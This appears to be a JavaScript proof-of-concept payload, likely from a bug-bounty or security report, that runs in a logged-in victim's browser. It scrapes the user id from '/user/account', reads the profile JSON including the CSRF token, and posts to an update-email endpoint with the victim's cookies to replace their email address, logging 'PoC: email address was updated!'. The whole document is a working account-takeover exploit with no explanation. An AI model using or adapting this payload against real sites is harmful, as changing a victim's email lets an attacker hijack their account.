fetch('/user/account')
  .then(response => response.text())
  .then(html => {
    const regex = /var tuid = (\d+)/;
    const match = html.match(regex);

    if (match && match[1]) {
      const integerValue = parseInt(match[1]);
      const apiUrl = '/users/' + integerValue + '/profile';

      fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
          console.log('Returned JSON:', data);
          
          const postData = {
			  newEmail: "test@gmail.com",
			  hiddenNewEmail: data.email,
			  unsubscribe_on_updateEmail: "false",
			  confirmNewEmail: "test@gmail.com",
			  csrfToken: data.csrfToken
			};

			const jsonData = JSON.stringify(postData);
			const requestOptions = {
			  method: 'POST',
			  headers: {
				'Content-Type': 'application/json'
			  },
			  body: jsonData,
			  credentials: 'include'
			};

			fetch('/users/' + integerValue + '/updateemail', requestOptions)
			  .then(response => response.json())
			  .then(data => {
				console.log('PoC: email address was updated!');
				console.log('Response JSON:', data);
			  });
        });
    }
});
